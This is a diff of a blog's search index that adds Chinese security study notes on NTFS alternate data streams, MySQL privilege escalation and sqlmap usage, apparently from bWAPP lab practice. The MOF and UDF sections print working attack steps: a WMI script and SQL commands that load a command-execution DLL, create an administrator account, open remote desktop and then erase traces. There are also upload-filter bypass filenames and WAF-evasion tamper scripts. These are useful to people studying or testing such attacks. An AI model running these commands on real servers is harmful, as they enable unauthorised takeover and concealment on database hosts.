@@ -1,6 +1,390 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>NTFS-ADS</title>
+    <url>/2020/09/27/NTFS-ADS/</url>
+    <content><![CDATA[<h1 id="NTFS交换数据流"><a href="#NTFS交换数据流" class="headerlink" title="NTFS交换数据流"></a>NTFS交换数据流</h1><h2 id="NTFS-ADS是什么"><a href="#NTFS-ADS是什么" class="headerlink" title="NTFS ADS是什么"></a>NTFS ADS是什么</h2><p>NTFS交换数据流（<code>alternate data streams</code>简称ADS）是NTFS磁盘格式的一个特性。</p>
+<h2 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h2><p>一个完整的流的格式为：<code>&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</code></p>
+<p>流类型总是以<code>$</code>符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流($DATA)，默认流名为空</p>
+<p>ADS可以省略流名，但不能省略流类型 （demo.txt : : $DATA）</p>
+<p>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流(<code>$INDEX_ALLOCATION</code>)，流名默认为<code>$I30</code></p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><table>
+<thead>
+<tr>
+<th>上传的文件名</th>
+<th>服务器表面现象</th>
+<th align="left">生成的文件内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Test.php:a.jpg</td>
+<td>生成Test.php</td>
+<td align="left">空</td>
+</tr>
+<tr>
+<td>Test.php::$DATA</td>
+<td>生成test.php</td>
+<td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
+</tr>
+<tr>
+<td>Test.php::$INDEX_ALLOCATION</td>
+<td>生成test.php文件夹</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td>Test.php::$DATA\0.jpg</td>
+<td>生成0.jpg</td>
+<td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
+</tr>
+<tr>
+<td>Test.php::$DATA\aaa.jpg</td>
+<td>生成aaa.jpg</td>
+<td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
+</tr>
+</tbody></table>
+<p><a href="https://www.jianshu.com/p/7842ee248621" target="_blank" rel="noopener">NTFS ADS的前世今生</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>SQLPrivilgeEscalation</title>
+    <url>/2020/09/27/SQLPrivilgeEscalation/</url>
+    <content><![CDATA[<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h2 id="1-MOF-提取"><a href="#1-MOF-提取" class="headerlink" title="1.MOF 提取"></a>1.MOF 提取</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>利用了<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
+<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="编写mof文件，必须命名为nullevt-mof"><a href="#编写mof文件，必须命名为nullevt-mof" class="headerlink" title="编写mof文件，必须命名为nullevt.mof"></a>编写mof文件，必须命名为nullevt.mof</h4><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">#pragma namespace(<span class="string">"\\\\.\\root\\subscription"</span>)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">    Name  = <span class="string">"filtP2"</span>;</span><br><span class="line">    Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"</span>Win32_LocalTime\<span class="string">" "</span></span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">    ScriptText =</span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"</span>WScript.Shell\<span class="string">")\nWSH.run(\"</span>net.exe user admin admin.admin /add\<span class="string">")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    <span class="built_in">Filter</span> = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="上传到c-windows-system32-或c-winnt-目录"><a href="#上传到c-windows-system32-或c-winnt-目录" class="headerlink" title="上传到c:\windows\system32(或c:\winnt\)目录"></a>上传到c:\windows\system32(或c:\winnt\)目录</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'</span><br><span class="line"></span><br><span class="line"><span class="comment">--此处C:/wmpub/nullevt.mof为上次mof文件位置，可联合文件上传漏洞，在www目录下写入mof文件</span></span><br></pre></td></tr></table></figure>
+
+<p>此处<code>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin.admin /add\&quot;)</code>执行添加admin用户</p>
+<p>再次上传mof文件，把admin用户提权到管理员组（修改<code>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators secist /add\&quot;)</code>）</p>
+<p>最终创建了管理员用户</p>
+<h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mstsc /admin</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-UDF提取"><a href="#2-UDF提取" class="headerlink" title="2.UDF提取"></a>2.UDF提取</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">1、其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码。</span><br><span class="line">2、Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</span><br><span class="line">3、Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</span><br><span class="line">4、掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。</span><br><span class="line"></span><br><span class="line">sqlmap里是有udf.dll文件的，就在sqlmap/udf/mysql/windows目录下，里面有32位和64位</span><br><span class="line">注意：这里的位数是mysql的位数，并不是对方系统的位数。sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本步骤-1"><a href="#基本步骤-1" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="udf-dll解码"><a href="#udf-dll解码" class="headerlink" title="udf.dll解码"></a>udf.dll解码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/sqlmap/extra/cloak/cloak.py  -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/share/sqlmap/extra/cloak/cloak.py自带的locak解码脚本</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 为sqlmap自带UDF文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">执行完成后会在/usr/share/sqlmap/data/udf/mysql/windows/64/文件夹下生成lib_mysqludf_sys.dll文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_eval，执行任意命令，并将输出返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_exec，执行任意命令，并将退出码返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_get，获取一个环境变量。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_set，创建或修改一个环境变量。</span></span><br></pre></td></tr></table></figure>
+
+<p>并把lib_mysqludf_sys.dll文件上传到站点目录下，改名为udf.dll</p>
+<h4 id="文件导入"><a href="#文件导入" class="headerlink" title="文件导入"></a>文件导入</h4><p>MySQL&lt;5.0，导出路径随意；</p>
+<p>5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）</p>
+<p>MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
+<p>一般lib\plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）有webshell可以直接创建，没有的话使用 into dumpfile 写入</p>
+<h5 id="手工建立lib-plugin文件夹"><a href="#手工建立lib-plugin文件夹" class="headerlink" title="手工建立lib\plugin文件夹"></a>手工建立lib\plugin文件夹</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@basedir;  //查找到mysql的目录</span><br><span class="line"> </span><br><span class="line">mysql&gt; select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录</span><br><span class="line"> </span><br><span class="line">mysql&gt; select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';    //利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.jianshu.com/p/7842ee248621" target="_blank" rel="noopener">NTFS ADS的前世今生</a></p>
+<h4 id="从udf文件中引入自定义函数"><a href="#从udf文件中引入自定义函数" class="headerlink" title="从udf文件中引入自定义函数"></a>从udf文件中引入自定义函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname 'udf.dll'; </span><br><span class="line"><span class="comment">--sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="执行自定义函数"><a href="#执行自定义函数" class="headerlink" title="执行自定义函数"></a>执行自定义函数</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; select sys_eval('net user admin admin /add'); </span><br><span class="line">mysql&gt; select sys_eval('net localgroup administrators admin /add');</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程桌面连接-1"><a href="#远程桌面连接-1" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mstsc /admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop function sys_eval; --删除函数</span><br><span class="line">mysql&gt; delete from mysql.func where name='sys_eval' --删除函数</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>版本&gt;5.6.34 secure-file-priv需要为空才可以通过mysql传udf</strong></p>
+<h4 id="1-into-outfile-直接写入"><a href="#1-into-outfile-直接写入" class="headerlink" title="1. into outfile 直接写入"></a>1. into outfile 直接写入</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.将udf的内容进行16进制编码 得到字符串 A</span></span><br><span class="line">hexdump lib_mysqludf_sys.dll</span><br><span class="line"><span class="comment">-- 2.写入文件</span></span><br><span class="line">mysql&gt; select A into outfile 'C:/Program Files/MySQL/MySQL Server 5.5/lib/plugin/udf.dll';</span><br><span class="line"><span class="comment">-- 3.创建sys_eval</span></span><br><span class="line">mysql&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';</span><br><span class="line"><span class="comment">-- 4.获取system执行权限</span></span><br><span class="line">mysql&gt; select sys_eval('whoami');</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-表内容导出写入"><a href="#2-表内容导出写入" class="headerlink" title="2. 表内容导出写入"></a>2. 表内容导出写入</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.将udf的内容进行16进制编码 得到字符串 A</span></span><br><span class="line">hexdump lib_mysqludf_sys.dll</span><br><span class="line"><span class="comment">-- 2.建立表保存16进制内容</span></span><br><span class="line">mysql&gt; set @my_udf=concat('',A);</span><br><span class="line">mysql&gt; create table udf_data(data LONGBLOB);</span><br><span class="line"><span class="comment">--3.将my_udf的内容插入表udf_data中。</span></span><br><span class="line">mysql&gt; insert into udf_data values("");</span><br><span class="line">mysql&gt; update udf_data set data = @my_udf;</span><br><span class="line"><span class="comment">--4.将内容导出到文件。</span></span><br><span class="line">mysql&gt; select data from udf_data into DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.5/lib/plugin/udf.dll';</span><br><span class="line"><span class="comment">--5.执行系统命令</span></span><br><span class="line">mysql&gt; create function sys_eval returns string soname 'udf.dll';</span><br><span class="line">mysql&gt; select sys_eval('whoami');</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-sqlmap写入UDF"><a href="#3-sqlmap写入UDF" class="headerlink" title="3.sqlmap写入UDF"></a>3.sqlmap写入UDF</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -d "mysql://root:root@172.0.0.1:3306/mysql" <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/x728999452/article/details/52413974" target="_blank" rel="noopener">MySQL 利用UDF执行命令</a></p>
+<p><a href="https://www.cnblogs.com/h4ck0ne/p/5154604.html" target="_blank" rel="noopener">mof/udf提权</a></p>
+<p><a href="https://blog.csdn.net/weixin_45427650/article/details/104849928" target="_blank" rel="noopener">udf提取</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bWAPP-sqlmap</title>
+    <url>/2020/09/26/bWAPP-sqlmap/</url>
+    <content><![CDATA[<h1 id="Sqlmap常规使用"><a href="#Sqlmap常规使用" class="headerlink" title="Sqlmap常规使用"></a>Sqlmap常规使用</h1><h2 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h2><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-h,–help</td>
+<td align="left">显示基本帮助信息并退出</td>
+</tr>
+<tr>
+<td>–version</td>
+<td align="left">显示程序版本信息并退出</td>
+</tr>
+<tr>
+<td>-u ，–url</td>
+<td align="left">目标URL（get请求注入，直接使用该参数）</td>
+</tr>
+<tr>
+<td>-r REQUESTFILE</td>
+<td align="left">一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</td>
+</tr>
+<tr>
+<td>–cookie=COOKIE</td>
+<td align="left">HTTP Cookieheader 值</td>
+</tr>
+<tr>
+<td>–user-agent=AGENT</td>
+<td align="left">设置HTTP请求头，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</td>
+</tr>
+<tr>
+<td>–referer=REFERER</td>
+<td align="left">在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</td>
+</tr>
+<tr>
+<td>–headers=HEADERS</td>
+<td align="left">可以通过–headers参数来增加额外的http头</td>
+</tr>
+<tr>
+<td>–delay=DELAY</td>
+<td align="left">可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-f, –fingerprint</td>
+<td>执行广泛的DBMS版本指纹检查</td>
+</tr>
+<tr>
+<td>–mobile</td>
+<td>设定一个手机的User-Agent来模仿手机登陆</td>
+</tr>
+<tr>
+<td>–level=LEVEL</td>
+<td>执行测试的等级（1-5，默认为1）</td>
+</tr>
+<tr>
+<td>–string=STRING</td>
+<td>查询时有效时在页面匹配字符串</td>
+</tr>
+</tbody></table>
+<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-o</td>
+<td>打开所有的优化开关</td>
+</tr>
+<tr>
+<td>–predict-output</td>
+<td>预测普通查询输出</td>
+</tr>
+<tr>
+<td>–keep-alive</td>
+<td>使用持久HTTP（S）连接</td>
+</tr>
+<tr>
+<td>–null-connection</td>
+<td>获取页面长度</td>
+</tr>
+<tr>
+<td>–threads=THREADS</td>
+<td>当前http(s)最大请求数 (默认 1)</td>
+</tr>
+<tr>
+<td>–timeout=TIMEOUT</td>
+<td>可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</td>
+</tr>
+<tr>
+<td>–retries=RETRIES</td>
+<td>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</td>
+</tr>
+<tr>
+<td>–regexp=REGEXP</td>
+<td>查询时有效时在页面匹配正则表达式</td>
+</tr>
+</tbody></table>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">-a, –all</td>
+<td>获取所有信息</td>
+</tr>
+<tr>
+<td align="left">-b, –banner</td>
+<td>获取数据库管理系统的标识</td>
+</tr>
+<tr>
+<td align="left">–current-user</td>
+<td>获取数据库管理系统当前用户</td>
+</tr>
+<tr>
+<td align="left">–privileges</td>
+<td>枚举数据库管理系统用户的权限</td>
+</tr>
+<tr>
+<td align="left">–hostname</td>
+<td>获取数据库服务器的主机名称</td>
+</tr>
+<tr>
+<td align="left">–is-dba</td>
+<td>检测DBMS当前用户是否DBA</td>
+</tr>
+<tr>
+<td align="left">–passwords</td>
+<td>枚举数据库管理系统用户密码哈希</td>
+</tr>
+<tr>
+<td align="left">–dump</td>
+<td>转储数据库表项</td>
+</tr>
+<tr>
+<td align="left">–count</td>
+<td>检索表的项目数</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>–dbs</td>
+<td>枚举数据库管理系统数据库</td>
+</tr>
+<tr>
+<td>-D DBName</td>
+<td>要进行枚举的指定数据库名</td>
+</tr>
+<tr>
+<td>–tables</td>
+<td>枚举的DBMS数据库中的表</td>
+</tr>
+<tr>
+<td>-T TableName</td>
+<td>DBMS数据库表枚举</td>
+</tr>
+<tr>
+<td>–columns</td>
+<td>枚举DBMS数据库表列</td>
+</tr>
+<tr>
+<td>-C ColumnName,ColumnName</td>
+<td>DBMS数据库表列枚举</td>
+</tr>
+</tbody></table>
+<h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>–os-cmd=OSCMD</td>
+<td>执行操作系统命令（OSCMD）</td>
+</tr>
+<tr>
+<td>–os-shell</td>
+<td>交互式的操作系统的shell</td>
+</tr>
+<tr>
+<td>–os-pwn</td>
+<td>获取一个OOB shell，meterpreter或VNC</td>
+</tr>
+<tr>
+<td>–os-smbrelay</td>
+<td>一键获取一个OOBshell，meterpreter或VNC</td>
+</tr>
+<tr>
+<td>–priv-esc</td>
+<td>数据库进程用户权限提升</td>
+</tr>
+</tbody></table>
+<h3 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>–reg-read</td>
+<td>读一个Windows注册表项值</td>
+</tr>
+<tr>
+<td>–reg-add</td>
+<td>写一个Windows注册表项值数据</td>
+</tr>
+<tr>
+<td>–reg-del</td>
+<td>删除Windows注册表键值</td>
+</tr>
+</tbody></table>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--tamper 脚本名称 脚本名称</span><br><span class="line"><span class="comment">#多个tamper脚本之间用空格隔开</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>randomcomments.py</td>
+<td>用/**/分割sql关键字</td>
+</tr>
+<tr>
+<td>base64encode.py</td>
+<td>用base64编码替换</td>
+</tr>
+<tr>
+<td>apostrophenulencode.py</td>
+<td>绕过过滤双引号，替换字符和双引号</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+</tr>
+<tr>
+<td>versionedmorekeywords.py</td>
+<td>注释绕过</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>替换空格</td>
+</tr>
+<tr>
+<td>apostrophemask.py</td>
+<td>用utf8代替引号</td>
+</tr>
+</tbody></table>
+<p><a href="https://blog.csdn.net/qq_36374896/article/details/83658305?utm_medium=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.wap_blog_relevant_no_pic&depth_1-utm_source=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.wap_blog_relevant_no_pic" target="_blank" rel="noopener">sqlmap的常用tamper脚本</a></p>
+<p><a href="https://blog.csdn.net/whatday/article/details/54774043?utm_medium=distribute.pc_relevant.none-task-blog-title-3&spm=1001.2101.3001.4242" target="_blank" rel="noopener">sqlmap –tamper 绕过WAF脚本分类整理</a></p>
+<h2 id="常规用法"><a href="#常规用法" class="headerlink" title="常规用法"></a>常规用法</h2><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL --cookie=<span class="string">"COOKIE"</span> --banner --dbs --batch </span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap -u URL --cookie="COOKIE" -D DatabaseName -T TableName -C ColumnName,ColumnName...  --dump --batch -o</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL --data=<span class="string">"DATA"</span> --cookie=<span class="string">"COOKIE"</span> --banner --dbs --batch  -o</span><br><span class="line"></span><br><span class="line">sqlmap -r post.txt </span><br><span class="line"><span class="comment">#post.txt文件为提交抓包获取的数据包</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">Sqlmap攻略及技巧分享 </a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>bWAPP-XPathInjection</title>
     <url>/2020/09/23/bWAPP-XPathInjection/</url>
     <content><![CDATA[<h1 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>XPath是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言,后来独立成了一种W3C标准</p>
@@ -455,11 +839,6 @@
 <p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922160215133.png" alt="image-20200922160215133"></p>
 <h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>分别使用了 <code>addslashes（）</code>和 <code>mysqli_real_escape_string（）</code>对数据进行消毒</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>bWAPP--SQLInjectionStore1</title>
-    <url>/2020/09/22/bWAPP-SQLInjectionStore1/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>bWAPP-SQLInjectionSQLite</title>
